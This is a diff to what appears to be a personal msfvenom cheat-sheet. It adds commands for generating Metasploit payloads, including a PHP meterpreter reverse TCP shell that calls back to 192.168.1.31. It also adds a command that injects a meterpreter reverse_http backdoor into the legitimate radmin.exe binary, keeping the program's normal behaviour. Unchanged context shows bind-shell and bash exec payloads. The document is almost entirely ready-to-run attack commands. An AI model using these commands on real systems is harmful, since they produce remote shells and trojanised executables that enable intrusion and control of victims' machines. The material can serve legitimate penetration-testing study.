@@ -1,4 +1,19 @@
+# List payloads
+msfvenom -l payloads
+
 # create x86 payload for env variable
 msfvenom -p linux/x86/exec CMD=/bin/bash --format bash -n 100 --pad-nops -b '\x00\xff' > to_source.sh
 
 msfvenom -p windows/shell_bind_tcp -s 607 -b '\x00\x40\x0a\x0d' --format python
+
+# show options for a payload
+msfvenom -p php/meterpreter/reverse_tcp --list-options
+
+# generate a payload
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.31 LPORT=2323 -f raw
+
+# create exe file
+msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.31 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe -o radmin2.exe -a x86 --platform windows
+
+# bash payload
+msfvenom -p linux/x86/exec -n 40 CMD=/bin/bash --format bash
